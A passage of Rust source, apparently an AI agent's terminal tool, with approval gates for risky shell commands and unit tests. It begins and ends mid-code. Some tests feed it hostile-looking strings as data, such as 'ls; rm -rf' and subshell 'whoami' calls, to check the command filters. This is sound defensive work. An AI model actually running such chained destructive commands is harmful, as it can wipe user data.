                        || command.contains("<< \"");
                    if !uses_quoted_heredoc {
                        return Ok(ToolCallOutcome::from_output(
                            "Large heredoc file creation is unreliable through the terminal. \
                             Use the `write_file` tool instead — it writes files atomically \
                             and avoids shell quoting issues. If write_file fails with JSON \
                             encoding errors, use a quoted heredoc: cat > file << 'EOF'"
                                .to_string(),
                        ));
                    }
                }

                // Soft-block python3 -c with file WRITE I/O: redirects to write_file/edit_file
                // which are safer, faster, and don't require approval.
                // Read-only operations (ast.parse, open().read(), json.load) are allowed
                // since there's no dedicated tool for validation/syntax checks.
                if is_python_c_with_file_write_io(command) {
                    return Ok(ToolCallOutcome::from_output(
                        "Blocked: `python3 -c` with file write I/O is not allowed through terminal.\n\n\
                         Use dedicated tools instead:\n\
                         - `write_file` to create or overwrite files\n\
                         - `edit_file` to modify specific parts of a file\n\n\
                         These tools are faster, do not require approval, and handle \
                         encoding/quoting correctly."
                            .to_string(),
                    ));
                }

                let daemon_hits = detect_daemonization_primitives(command);
                let mut daemonization_approved = false;
                if !daemon_hits.is_empty() {
                    let is_owner = args
                        ._user_role
                        .as_deref()
                        .is_some_and(|role| role.eq_ignore_ascii_case("owner"));
                    if !is_owner {
                        return Ok(ToolCallOutcome::from_output(format!(
                            "Blocked: daemonization primitives detected ({}) and only owners can approve detached/background process commands.",
                            daemon_hits.join(", ")
                        )));
                    }

                    if !args.detach {
                        return Ok(ToolCallOutcome::from_output(format!(
                            "Blocked: daemonization primitives detected ({}). \
                             Set `detach=true` explicitly for intentional long-lived background execution.",
                            daemon_hits.join(", ")
                        )));
                    }

                    let mut warnings = vec![
                        format!(
                            "Daemonization primitives detected: {}",
                            daemon_hits.join(", ")
                        ),
                        "Detached/background processes may survive cancellation and continue running.".to_string(),
                    ];
                    warnings.push("Approve only if this is intentional and necessary.".to_string());

                    match self
                        .request_approval(
                            &args._session_id,
                            command,
                            RiskLevel::Critical,
                            warnings,
                            args._task_id.as_deref(),
                        )
                        .await
                    {
                        Ok(ApprovalResponse::AllowOnce)
                        | Ok(ApprovalResponse::AllowSession)
                        | Ok(ApprovalResponse::AllowAlways) => {
                            daemonization_approved = true;
                        }
                        Ok(ApprovalResponse::Deny) => {
                            return Ok(ToolCallOutcome::from_output(
                                "Daemonizing command denied by owner.".to_string(),
                            ));
                        }
                        Err(e) => {
                            return Ok(ToolCallOutcome::from_output(format!(
                                "Could not get owner approval for daemonizing command: {}",
                                e
                            )));
                        }
                    }
                }

                // Classify command risk
                let mut assessment = classify_command(command);

                // Deterministic hard block for irreversible broad-path deletes.
                if let Some(reason) = hard_block_reason(command) {
                    warn!(
                        session_id = %args._session_id,
                        task_id = ?args._task_id,
                        command = %command,
                        reason = %reason,
                        "Blocked dangerous irreversible command"
                    );
                    return Ok(ToolCallOutcome::from_output(format!(
                        "{} Use scoped, non-destructive commands instead.",
                        reason
                    )));
                }

                // Check for learned patterns and potentially lower risk
                if let Some(ref pool) = self.pool {
                    if let Ok(Some((pattern, similarity))) =
                        find_matching_pattern(pool, command).await
                    {
                        if pattern.is_trusted()
                            && similarity >= 0.9
                            && assessment.level != RiskLevel::Critical
                        {
                            // Trusted pattern with high similarity - lower risk by one level
                            let original_level = assessment.level;
                            assessment.level = match assessment.level {
                                RiskLevel::Critical => RiskLevel::High,
                                RiskLevel::High => RiskLevel::Medium,
                                RiskLevel::Medium => RiskLevel::Safe,
                                RiskLevel::Safe => RiskLevel::Safe,
                            };
                            if assessment.level != original_level {
                                assessment.warnings.push(format!(
                                    "Risk lowered: similar to trusted pattern '{}' (approved {}x)",
                                    pattern.pattern, pattern.approval_count
                                ));
                                info!(
                                    command = %command,
                                    pattern = %pattern.pattern,
                                    original_risk = %original_level,
                                    new_risk = %assessment.level,
                                    "Lowered risk based on learned pattern"
                                );
                            }
                        } else if pattern.denial_count > pattern.approval_count {
                            // Pattern is frequently denied - add warning
                            assessment.warnings.push(format!(
                                "Similar commands have been denied {}x",
                                pattern.denial_count
                            ));
                        }
                    }
                }

                // Check if this is a trusted session (explicitly set by ChannelContext,
                // not derived from session ID strings — prevents session ID spoofing).
                let is_trusted_session = args._trusted_session;
                if args.detach && is_trusted_session {
                    // Intentional: trusted scheduled sessions are auto-approved, so
                    // disallow detached long-lived processes in that mode.
                    return Ok(ToolCallOutcome::from_output(
                        "Blocked: detach=true is not allowed for trusted scheduled sessions."
                            .to_string(),
                    ));
                }

                if args.detach && !daemonization_approved {
                    assessment.warnings.push(
                        "Detached execution requested (process may outlive task boundaries)."
                            .to_string(),
                    );
                }

                // Determine if approval is needed.
                // Note: is_allowed() checks both permanent AND session-approved prefixes.
                //
                // Ordering (enforced here; do not reorder):
                //   1. daemonization_approved  → never re-prompt after daemonization gate
                //   2. correction_preapproved  → dispatcher-owned one-shot bypass (Rust side only)
                //   3. _untrusted_source       → external triggers always re-prompt
                //   4. detach && !is_allowed   → novel detached commands re-prompt
                //   5. _trusted_session        → scheduled tasks skip prompt
                //   6. !is_allowed             → normal allowlist check
                let is_allowed = self.is_allowed(command).await;
                let needs_approval = if daemonization_approved {
                    false
                } else if correction_preapproved {
                    // Dispatcher classified this call as safe; skip the user prompt.
                    // _untrusted_source is intentionally overridden here: the correction
                    // gate is only active for trigger sessions, so if we reach this
                    // branch, the gate has already confirmed safety.
                    info!(command = %command, "Auto-approved: correction gate preapproval");
                    false
                } else if args._untrusted_source {
                    // External triggers always need approval regardless of mode
                    info!(command = %command, risk = %assessment.level, "Forcing approval: untrusted source");
                    true
                } else if args.detach && !is_allowed {
                    // Allowlisted commands (permanent or session approvals)
                    // may run detached without re-prompting; only novel
                    // detached commands force approval.
                    info!(command = %command, "Forcing approval: detach=true and command not pre-approved");
                    true
                } else if is_trusted_session {
                    // Trusted scheduled tasks bypass approval
                    info!(command = %command, session = %args._session_id, "Auto-approved: trusted scheduled task");
                    false
                } else {
                    !is_allowed
                };

                if needs_approval {
                    match self
                        .request_approval(
                            &args._session_id,
                            command,
                            assessment.level,
                            assessment.warnings.clone(),
                            args._task_id.as_deref(),
                        )
                        .await
                    {
                        Ok(ApprovalResponse::AllowOnce) => {
                            // Just run this once, but still learn from it
                            if let Some(ref pool) = self.pool {
                                let _ = record_approval(pool, command).await;
                            }
                        }
                        Ok(ApprovalResponse::AllowSession) => {
                            // Save to session-only storage (cleared on restart)
                            self.add_session_prefix(command).await;
                            if let Some(ref pool) = self.pool {
                                let _ = record_approval(pool, command).await;
                            }
                        }
                        Ok(ApprovalResponse::AllowAlways) => {
                            // Save to permanent storage (DB)
                            self.add_prefix(command).await;
                            if let Some(ref pool) = self.pool {
                                let _ = record_approval(pool, command).await;
                            }
                        }
                        Ok(ApprovalResponse::Deny) => {
                            // Record denial for learning
                            if let Some(ref pool) = self.pool {
                                let _ = record_denial(pool, command).await;
                            }
                            return Ok(ToolCallOutcome::from_output(
                                "Command denied by user.".to_string(),
                            ));
                        }
                        Err(e) => {
                            return Ok(ToolCallOutcome::from_output(format!(
                                "Could not get approval: {}",
                                e
                            )));
                        }
                    }
                }

                self.handle_run(
                    command,
                    &notify_session_id,
                    args._goal_id.as_deref(),
                    args._task_id.as_deref(),
                    args.detach,
                    status_tx,
                )
                .await?
            }
        };

        if outcome.metadata.exit_code.is_none() {
            outcome.metadata.exit_code = extract_terminal_exit_code(&outcome.output);
        }

        Ok(outcome)
    }
}

impl Drop for TerminalTool {
    fn drop(&mut self) {
        // Best-effort kill of all tracked background processes.
        if let Ok(running) = self.running.try_lock() {
            for proc in running.values() {
                send_sigterm(proc.child_id);
                send_sigkill(proc.child_id);
            }
        }
    }
}

#[derive(Deserialize)]
struct TerminalArgs {
    command: Option<String>,
    #[serde(default = "default_action")]
    action: String,
    pid: Option<u32>,
    /// If true, allow a timed-out command to outlive task boundaries.
    /// Default false: timed-out background commands are task-owned and auto-cleaned
    /// when the task ends.
    #[serde(default, alias = "background")]
    detach: bool,
    #[serde(default)]
    _untrusted_source: bool,
    #[serde(default)]
    _session_id: String,
    #[serde(default)]
    _task_id: Option<String>,
    /// Injected by agent - goal context for routing background notifications.
    #[serde(default)]
    _goal_id: Option<String>,
    /// Injected by agent for role-aware safeguards.
    #[serde(default)]
    _user_role: Option<String>,
    /// Explicitly set by the agent from ChannelContext.trusted — never derived
    /// from session ID strings. Only trusted scheduled tasks set this to true.
    #[serde(default)]
    _trusted_session: bool,
}

fn default_action() -> String {
    "run".to_string()
}

fn extract_terminal_exit_code(output: &str) -> Option<i32> {
    let marker = "[exit code:";
    let start = output.rfind(marker)?;
    let rest = output[start + marker.len()..].trim_start();
    let code_token: String = rest
        .chars()
        .take_while(|ch| ch.is_ascii_digit() || *ch == '-')
        .collect();
    if code_token.is_empty() {
        None
    } else {
        code_token.parse::<i32>().ok()
    }
}

fn foreground_terminal_metadata(exit_code: Option<i32>) -> ToolCallMetadata {
    ToolCallMetadata {
        exit_code,
        timed_out: false,
        background_started: false,
        detached: false,
        completion_notifications_enabled: false,
        transport_error: None,
        http_status: None,
        direct_response: None,
        semantics: ToolCallSemantics::default(),
        read_file: None,
        ..Default::default()
    }
}

fn tracked_background_metadata(
    detached: bool,
    completion_notifications_enabled: bool,
    exit_code: Option<i32>,
) -> ToolCallMetadata {
    ToolCallMetadata {
        exit_code,
        timed_out: true,
        background_started: true,
        detached,
        completion_notifications_enabled,
        transport_error: None,
        http_status: None,
        direct_response: None,
        semantics: ToolCallSemantics::default(),
        read_file: None,
        ..Default::default()
    }
}

#[async_trait]
impl Tool for TerminalTool {
    fn name(&self) -> &str {
        "terminal"
    }

    fn description(&self) -> &str {
        "Execute a shell command. If a command is not pre-approved, the user will be asked to authorize it."
    }

    fn schema(&self) -> Value {
        json!({
            "name": "terminal",
            "description": "Run shell commands on this machine. Commands may require user approval. Long-running commands can be checked or killed later; use write_file instead of shell redirection for file creation. If a command chain (&&, ||, ;, |) contains ANY dangerous segment, refuse the ENTIRE chain and ask which specific operation the user wants — never split a chain to run only the \"safe\" parts.",
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "Shell command for action=run"
                    },
                    "action": {
                        "type": "string",
                        "enum": ["run", "check", "kill", "trust_all"],
                        "description": "run, check, kill, or trust_all"
                    },
                    "detach": {
                        "type": "boolean",
                        "description": "Keep the process alive after the task ends"
                    },
                    "pid": {
                        "type": "integer",
                        "description": "Process ID for check/kill"
                    }
                },
                "required": ["action", "command"],
                "additionalProperties": false
            }
        })
    }

    fn capabilities(&self) -> ToolCapabilities {
        ToolCapabilities {
            read_only: false,
            external_side_effect: true,
            needs_approval: true,
            idempotent: false,
            high_impact_write: true,
        }
    }

    fn call_semantics(&self, arguments: &str) -> ToolCallSemantics {
        let args = serde_json::from_str::<Value>(arguments).ok();
        let action = args
            .as_ref()
            .and_then(|value| value.get("action"))
            .and_then(|value| value.as_str())
            .map(|value| value.trim().to_ascii_lowercase())
            .unwrap_or_else(|| "run".to_string());

        match action.as_str() {
            "check" => ToolCallSemantics::observation()
                .with_verification_mode(ToolVerificationMode::ResultContent),
            "kill" => ToolCallSemantics::mutation(),
            "trust_all" => ToolCallSemantics::administrative(),
            _ => args
                .as_ref()
                .and_then(|value| value.get("command"))
                .and_then(|value| value.as_str())
                .map(classify_shell_command)
                .unwrap_or_else(ToolCallSemantics::mutation),
        }
    }

    async fn call(&self, arguments: &str) -> anyhow::Result<String> {
        // For backwards compatibility, delegate to call_with_status with no sender.
        self.call_with_status(arguments, None).await
    }

    async fn call_with_status(
        &self,
        arguments: &str,
        status_tx: Option<mpsc::Sender<StatusUpdate>>,
    ) -> anyhow::Result<String> {
        self.call_with_status_outcome(arguments, status_tx)
            .await
            .map(|outcome| outcome.output)
    }

    async fn call_with_status_outcome(
        &self,
        arguments: &str,
        status_tx: Option<mpsc::Sender<StatusUpdate>>,
    ) -> anyhow::Result<ToolCallOutcome> {
        self.execute_terminal(arguments, status_tx, false).await
    }

    async fn call_with_execution_context(
        &self,
        arguments: &str,
        status_tx: Option<mpsc::Sender<StatusUpdate>>,
        exec_ctx: ToolExecutionContext,
    ) -> anyhow::Result<ToolCallOutcome> {
        // Correction preapproval is only honored for action="run".  For check/kill/trust_all,
        // the normal path (no preapproval) is used because:
        //   - check/kill have no user-approval gate to bypass.
        //   - trust_all must never be silently executed by the correction gate.
        let correction_preapproved = if exec_ctx.correction_preapproved {
            // Peek at the action field without fully parsing the args yet.
            let action = serde_json::from_str::<serde_json::Value>(arguments)
                .ok()
                .and_then(|v| v.get("action").and_then(|a| a.as_str()).map(str::to_string))
                .unwrap_or_else(|| "run".to_string());
            action == "run" || action.is_empty()
        } else {
            false
        };
        self.execute_terminal(arguments, status_tx, correction_preapproved)
            .await
    }

    async fn on_task_end(&self, task_id: &str, _session_id: &str) -> anyhow::Result<()> {
        let cleaned = self.cleanup_task_processes(task_id).await?;
        if cleaned > 0 {
            info!(
                task_id,
                cleaned, "Cleaned up task-owned terminal background process(es)"
            );
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::memory::embeddings::EmbeddingService;
    use crate::state::SqliteStateStore;
    use crate::traits::{NotificationStore, StateStore, Tool};
    use sqlx::SqlitePool;
    use std::sync::Arc;
    use std::time::Duration;

    #[test]
    fn deliverable_caption_has_no_command() {
        let cap = build_deliverable_caption("netprobe_results3.txt", None);
        assert!(
            !cap.contains("cd "),
            "caption must not contain a shell command"
        );
        assert!(
            !cap.contains('`'),
            "caption must not contain backticked command"
        );
        assert!(cap.contains("netprobe_results3.txt"));
    }

    #[test]
    fn test_reengagement_followup_steers_deferred_file_send() {
        // Regression (screenshot 2026-06-24): user asked "Send me the file when
        // done"; the command ran past 30s and was moved to background, so the
        // original turn ended before the file was sent. The re-engagement
        // follow-up must explicitly steer the model to complete deferred
        // deliverables (call send_file), not merely summarize the output.
        // No persisted checklist → generic deferred-deliverable steering.
        let followup = build_background_reengagement_followup(
            "python3 /tmp/ping_latency.py",
            "latency results written to /tmp/latency.txt",
            &[],
        );
        assert!(
            followup.contains("send_file"),
            "follow-up must steer file delivery: {followup}"
        );
        assert!(
            followup.contains("send, share, or deliver a file"),
            "follow-up must mention the deferred deliverable: {followup}"
        );
        assert!(
            followup.contains("latency results written to /tmp/latency.txt"),
            "follow-up must include the command output: {followup}"
        );
        assert!(
            followup.contains("python3 /tmp/ping_latency.py"),
            "follow-up must include the command: {followup}"
        );
    }

    #[test]
    fn test_reengagement_followup_lists_persisted_unchecked_items() {
        // With a durable checklist, the re-engagement names the exact still-
        // unchecked requirements instead of the generic hint.
        let followup = build_background_reengagement_followup(
            "python3 /tmp/ping.py",
            "latency written to /tmp/latency.txt",
            &["send the latency file to the user".to_string()],
        );
        assert!(
            followup.contains("send the latency file to the user"),
            "must list the unchecked item: {followup}"
        );
        assert!(
            followup.contains("/tmp/latency.txt"),
            "must include the command output: {followup}"
        );
        assert!(
            followup.contains("track_requirements"),
            "must instruct marking items completed: {followup}"
        );
    }

    #[test]
    fn test_reengagement_allowed_caps_per_session_window() {
        let mut log = HashMap::new();
        let t0 = Instant::now();

        // First MAX_REENGAGEMENTS_PER_WINDOW re-engagements pass.
        for i in 0..MAX_REENGAGEMENTS_PER_WINDOW {
            assert!(
                reengagement_allowed(&mut log, "session-a", t0),
                "re-engagement {} should be allowed",
                i
            );
        }
        // The next one within the window is blocked.
        assert!(!reengagement_allowed(&mut log, "session-a", t0));

        // A different session has its own budget.
        assert!(reengagement_allowed(&mut log, "session-b", t0));

        // After the window elapses, the budget refills.
        let later = t0 + REENGAGE_WINDOW + Duration::from_secs(1);
        assert!(reengagement_allowed(&mut log, "session-a", later));
    }

    #[test]
    fn test_reengagement_allowed_sliding_window_partial_expiry() {
        let mut log = HashMap::new();
        let t0 = Instant::now();

        assert!(reengagement_allowed(&mut log, "s", t0));
        let mid = t0 + REENGAGE_WINDOW / 2;
        assert!(reengagement_allowed(&mut log, "s", mid));
        assert!(reengagement_allowed(&mut log, "s", mid));
        // Budget exhausted at mid-window.
        assert!(!reengagement_allowed(&mut log, "s", mid));

        // Just past the first entry's expiry, exactly one slot frees up.
        let after_first = t0 + REENGAGE_WINDOW + Duration::from_secs(1);
        assert!(reengagement_allowed(&mut log, "s", after_first));
        assert!(!reengagement_allowed(&mut log, "s", after_first));
    }

    fn extract_pid_from_background_message(msg: &str) -> u32 {
        let marker = "pid=";
        let start = msg
            .find(marker)
            .expect("background response should include pid")
            + marker.len();
        let digits: String = msg[start..]
            .chars()
            .take_while(|c| c.is_ascii_digit())
            .collect();
        digits.parse().expect("pid should parse as u32")
    }

    #[test]
    fn extract_terminal_exit_code_parses_marker() {
        assert_eq!(
            extract_terminal_exit_code(
                "[Process pid=123 finished after 2s]\nall done\n[exit code: 42]"
            ),
            Some(42)
        );
    }

    #[test]
    fn tracked_background_metadata_marks_background_and_detached() {
        let metadata = tracked_background_metadata(true, false, None);
        assert!(metadata.background_started);
        assert!(metadata.timed_out);
        assert!(metadata.detached);
        assert!(!metadata.completion_notifications_enabled);
    }

    #[tokio::test]
    async fn timed_out_background_run_sets_notification_metadata_when_available() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_path = db_file.path().display().to_string();
        let embedding_service = Arc::new(EmbeddingService::new().unwrap());
        let state = Arc::new(
            SqliteStateStore::new(&db_path, 100, None, embedding_service)
                .await
                .unwrap(),
        );
        let pool = state.pool();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            4000,
            PermissionMode::Yolo,
            pool,
        )
        .await
        .with_state(state as Arc<dyn StateStore>);

        let outcome = tool
            .call_with_status_outcome(
                r#"{"action":"run","command":"sleep 2; echo notify-meta","_session_id":"sess_meta","_user_role":"Owner"}"#,
                None,
            )
            .await
            .unwrap();
        assert!(outcome.output.contains("Moved to background (pid="));
        assert!(outcome.metadata.background_started);
        assert!(outcome.metadata.timed_out);
        assert!(!outcome.metadata.detached);
        assert!(outcome.metadata.completion_notifications_enabled);
    }

    #[tokio::test]
    async fn timed_out_background_run_clears_notification_metadata_when_unavailable() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_path = db_file.path().display().to_string();
        let embedding_service = Arc::new(EmbeddingService::new().unwrap());
        let state = Arc::new(
            SqliteStateStore::new(&db_path, 100, None, embedding_service)
                .await
                .unwrap(),
        );
        let pool = state.pool();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            4000,
            PermissionMode::Yolo,
            pool,
        )
        .await;

        let outcome = tool
            .call_with_status_outcome(
                r#"{"action":"run","command":"sleep 2; echo no-notify-meta","_session_id":"sess_meta2","_user_role":"Owner"}"#,
                None,
            )
            .await
            .unwrap();
        assert!(outcome.output.contains("Moved to background (pid="));
        assert!(outcome.metadata.background_started);
        assert!(outcome.metadata.timed_out);
        assert!(!outcome.metadata.detached);
        assert!(!outcome.metadata.completion_notifications_enabled);
    }

    // ── contains_shell_operator tests ──

    #[test]
    fn test_shell_operator_semicolon() {
        assert!(contains_shell_operator("ls; rm -rf"));
    }

    #[test]
    fn test_shell_operator_pipe() {
        assert!(contains_shell_operator("cat file | grep pattern"));
    }

    #[test]
    fn test_shell_operator_backtick() {
        assert!(contains_shell_operator("echo `whoami`"));
    }

    #[test]
    fn test_shell_operator_and() {
        assert!(contains_shell_operator("cmd1 && cmd2"));
    }

    #[test]
    fn test_shell_operator_subshell() {
        assert!(contains_shell_operator("echo $(whoami)"));
    }

    #[test]
    fn test_no_shell_operator_clean() {
        assert!(!contains_shell_operator("cargo build --release"));
    }

    #[test]
    fn test_no_shell_operator_flags() {
        assert!(!contains_shell_operator("ls -la /tmp"));
    }

    #[test]
    fn test_detect_unscoped_recursive_grep_broad_path() {
        let detected = detect_unscoped_recursive_grep(r#"grep -rc "async fn" ."#);
        assert!(
            detected.is_some(),
            "expected broad recursive grep to be detected"
        );
        let (pattern, path) = detected.unwrap();
        assert_eq!(pattern, "async fn");
        assert_eq!(path, ".");
    }

    #[test]
    fn test_detect_unscoped_recursive_grep_allows_scoped_dir() {
        let detected = detect_unscoped_recursive_grep(r#"grep -R "todo" src"#);
        assert!(
            detected.is_none(),
            "scoped directory search should be allowed"
        );
    }

    #[test]
    fn test_detect_unscoped_recursive_grep_allows_excludes() {
        let detected = detect_unscoped_recursive_grep(
            r#"grep -R --exclude-dir=node_modules --exclude-dir=target "todo" ."#,
        );
        assert!(detected.is_none(), "grep with excludes should be allowed");
    }

    #[test]
    fn test_detect_unscoped_recursive_grep_in_chained_shell_command() {
        let detected =
            detect_unscoped_recursive_grep(r#"cd /tmp/project && grep -rc "async fn" ."#);
        assert!(
            detected.is_some(),
            "expected chained command recursive grep to be detected"
        );
        let (pattern, path) = detected.unwrap();
        assert_eq!(pattern, "async fn");
        assert_eq!(path, ".");
    }

    // ── unbounded disk scan detector tests ──

    #[test]
    fn is_broad_scan_root_matches_root_and_home_only() {
        assert!(is_broad_scan_root("/"));
        assert!(is_broad_scan_root("~"));
        assert!(is_broad_scan_root("~/"));
        assert!(is_broad_scan_root("$HOME"));
        // Subdirectories must NOT be flagged.
        assert!(!is_broad_scan_root("~/projects"));
        assert!(!is_broad_scan_root("/var/log"));
        assert!(!is_broad_scan_root("/usr"));
        assert!(!is_broad_scan_root("."));
    }

    // ── correction-scope derivation (3c) ──

    #[test]
    fn derive_correction_scope_home_targets() {
        let home = std::env::var_os("HOME")
            .map(std::path::PathBuf::from)
            .map(|h| std::fs::canonicalize(&h).unwrap_or(h))
            .expect("HOME set in test env");

        // `du -sh ~/* | sort` — glob over home → home dir.
        assert_eq!(
            derive_correction_scope_from_command("du -sh ~/* | sort"),
            home,
            "du over ~/* should derive the home dir"
        );
        // `find ~ -type f` — root is home itself.
        assert_eq!(
            derive_correction_scope_from_command("find ~ -type f"),
            home,
            "find ~ should derive the home dir"
        );
        // `du ~` — bare home.
        assert_eq!(
            derive_correction_scope_from_command("du ~"),
            home,
            "du ~ should derive the home dir"
        );
    }

    #[test]
    fn derive_correction_scope_root_target() {
        assert_eq!(
            derive_correction_scope_from_command("find / -type f"),
            std::path::PathBuf::from("/"),
            "find / should derive /"
        );
        assert_eq!(
            derive_correction_scope_from_command("du /"),
            std::path::PathBuf::from("/"),
            "du / should derive /"
        );
    }

    #[test]
    fn derive_correction_scope_bounded_dir() {
        // A specific bounded dir under home → that dir (expanded + canonicalized
        // if it exists, else the expanded path).
        let home = std::env::var("HOME").expect("HOME set");
        let target = format!("{}/projects", home.trim_end_matches('/'));
        let expected =
            std::fs::canonicalize(&target).unwrap_or_else(|_| std::path::PathBuf::from(&target));
        assert_eq!(
            derive_correction_scope_from_command(&format!("du -sh {target}/foo")),
            std::fs::canonicalize(format!("{target}/foo"))
                .unwrap_or_else(|_| std::path::PathBuf::from(format!("{target}/foo"))),
            "du of a specific bounded dir should derive that dir"
        );
        // Sanity: the bounded dir is not the broad home scope.
        assert_ne!(
            expected,
            std::path::PathBuf::from("/"),
            "bounded dir must not collapse to /"
        );
    }

    #[test]
    fn derive_correction_scope_no_path_falls_back_to_cwd() {
        let cwd = TerminalTool::correction_working_dir();
        assert_eq!(
            derive_correction_scope_from_command("echo hi"),
            cwd,
            "a command with no path operand should fall back to the daemon cwd"
        );
    }

    #[test]
    fn detect_unbounded_disk_scan_flags_the_incident_commands() {
        // The exact commands seen grinding for minutes on the live daemon.
        assert!(
            detect_unbounded_disk_scan("du -a / 2>/dev/null | sort -rn | head -n 10").is_some()
        );
        assert!(detect_unbounded_disk_scan("du -ah ~ | sort -rh | head -n 20").is_some());
        assert!(detect_unbounded_disk_scan(
            "cd '/' && find / -type f -size +100M -exec ls -lh {} + 2>/dev/null | sort -k5 -rh | head -n 10"
        ).is_some());
        assert!(detect_unbounded_disk_scan("find ~ -type f -size +500M").is_some());
    }

    #[test]
    fn detect_unbounded_disk_scan_passes_scoped_and_bounded_commands() {
        // Scoped to a subdirectory → fine.
        assert!(detect_unbounded_disk_scan("du -sh ~/projects").is_none());
        assert!(detect_unbounded_disk_scan("find ~/Downloads -type f -size +500M").is_none());
        assert!(detect_unbounded_disk_scan("du -ah /var/log | sort -rh | head").is_none());
        // find with a depth limit → fine (maxdepth bounds traversal).
        assert!(detect_unbounded_disk_scan("find / -maxdepth 2 -type d").is_none());
        assert!(detect_unbounded_disk_scan("find ~ -maxdepth 3 -name '*.rs'").is_none());
        // Unrelated commands → fine.
        assert!(detect_unbounded_disk_scan("ls -la ~").is_none());
        assert!(detect_unbounded_disk_scan("echo hello").is_none());
    }

    #[test]
    fn unbounded_scan_block_message_is_actionable() {
        let msg = unbounded_scan_block_message("find", "/");
        assert!(msg.to_lowercase().contains("scope") || msg.to_lowercase().contains("narrow"));
        assert!(msg.contains("maxdepth") || msg.contains("-size") || msg.contains("specific"));
    }

    // ── format_output tests ──

    #[test]
    fn test_humanize_elapsed() {
        assert_eq!(humanize_elapsed(0), "0s");
        assert_eq!(humanize_elapsed(40), "40s");
        assert_eq!(humanize_elapsed(59), "59s");
        assert_eq!(humanize_elapsed(60), "1m 0s");
        assert_eq!(humanize_elapsed(65), "1m 5s");
        assert_eq!(humanize_elapsed(3599), "59m 59s");
        assert_eq!(humanize_elapsed(3600), "1h 0m");
        assert_eq!(humanize_elapsed(3725), "1h 2m");
    }

    #[test]
    fn test_summarize_progress_output_short_passthrough() {
        assert_eq!(
            summarize_progress_output("working-update"),
            "working-update"
        );
        assert_eq!(
            summarize_progress_output("line one\nline two\nline three"),
            "line one\nline two\nline three"
        );
        assert_eq!(summarize_progress_output(""), "");
        assert_eq!(summarize_progress_output("  \n \n"), "");
    }

    #[test]
    fn test_summarize_progress_output_long_shows_count_and_tail() {
        // Chatty commands (ls -R) must not dump their full output into chat —
        // the ping shows a line count plus the most recent lines only.
        let output = (1..=500)
            .map(|i| format!("file_{}.txt", i))
            .collect::<Vec<_>>()
            .join("\n");
        let summary = summarize_progress_output(&output);
        assert!(
            summary.contains("500 lines of output so far"),
            "summary should report total line count: {}",
            summary
        );
        assert!(
            summary.contains("file_500.txt"),
            "summary should include the latest line: {}",
            summary
        );
        assert!(
            !summary.contains("file_1.txt\n"),
            "summary must not include early output lines: {}",
            summary
        );
        assert!(
            summary.lines().count() <= 4,
            "summary should be at most a header plus 3 tail lines: {}",
            summary
        );
    }

    #[test]
    fn test_summarize_progress_output_truncates_long_lines() {
        let long_line = "x".repeat(5000);
        let summary = summarize_progress_output(&long_line);
        assert!(
            summary.chars().count() <= 200,
            "individual lines must be capped: {} chars",
            summary.chars().count()
        );
    }

    #[test]
    fn format_output_returns_truncation_info_instead_of_embedding_notice() {
        let long = "x".repeat(5000);
        let (text, truncation) = format_output(&long, "", 4000);
        assert!(
            !text.contains("OUTPUT TRUNCATED"),
            "notice must not be embedded"
        );
        let info = truncation.expect("truncation info for oversized output");
        assert_eq!(info.total_chars, 5000);
        assert!(info.shown_chars <= 4000);
    }

    #[test]
    fn format_output_no_truncation_for_small_output() {
        let (text, truncation) = format_output("hello", "", 4000);
        assert!(text.contains("hello"));
        assert!(truncation.is_none());
    }

    #[test]
    fn completion_ping_promises_followup_only_when_answer_is_coming() {
        // Live UX repro (2026-07-02): user got "✅ Done — finished in 1m 3s."
        // then 2 minutes of silence while the re-engagement turn composed the
        // real answer. The ping must say the answer is still coming — but
        // only when re-engagement will actually follow (non-trivial output).
        let with_followup = background_completion_ping_message(Some(0), 63, true);
        assert!(with_followup.contains("Done — finished in 1m 3s"));
        assert!(
            with_followup.contains("Writing up the result now"),
            "got: {with_followup}"
        );

        // Trivial output → no re-engagement → no false promise.
        let no_followup = background_completion_ping_message(Some(0), 63, false);
        assert!(no_followup.contains("Done — finished in 1m 3s"));
        assert!(!no_followup.contains("Writing up the result now"));

        // Error case keeps its existing shape, plus the follow-up when the
        // output will be looked at.
        let err = background_completion_ping_message(Some(2), 40, true);
        assert!(err.contains("finished with errors in 40s"));
        assert!(err.contains("(exit code 2)"));
        assert!(err.contains("Looking at the output now"));
    }

    #[test]
    fn test_format_stdout_only() {
        let (result, truncation) = format_output("hello", "", 1000);
        assert_eq!(result, "hello");
        assert!(truncation.is_none());
    }

    #[test]
    fn test_format_stderr_appended() {
        let (result, truncation) = format_output("out", "err", 1000);
        assert_eq!(result, "out\n--- stderr ---\nerr");
        assert!(truncation.is_none());
    }

    #[test]
    fn test_format_empty_no_output() {
        let (result, truncation) = format_output("", "", 1000);
        assert_eq!(result, "(no output)");
        assert!(truncation.is_none());
    }

    #[test]
    fn test_format_truncation() {
        let long_output = "a".repeat(200);
        let (result, truncation) = format_output(&long_output, "", 100);
        // The returned text is the raw content only — no embedded notice.
        // The notice is rendered by the caller (foreground: from metadata;
        // background: inline at the delivery site).
        assert!(!result.contains("OUTPUT TRUNCATED"));
        assert_eq!(result.len(), 100);
        assert_eq!(result, "a".repeat(100));
        // The structured info must report the omitted amount so a caller
        // rendering the notice can't silently let the model fabricate the
        // rest (100 shown of 200 total).
        let info = truncation.expect("truncation info for oversized output");
        assert_eq!(info.shown_chars, 100);
        assert_eq!(info.total_chars, 200);
    }

    #[test]
    fn test_format_truncation_multibyte_utf8() {
        // "é" is 2 bytes in UTF-8, "日" is 3 bytes, "🎉" is 4 bytes
        let output = "aé日🎉".repeat(50); // mixed multi-byte chars
                                          // Truncate at various positions that may land mid-char
        for max in [1, 2, 3, 4, 5, 10, 50, 100] {
            let (result, truncation) = format_output(&output, "", max);
            // Must not panic and must be valid UTF-8 (String guarantees this)
            assert!(!result.is_empty());
            if output.len() > max {
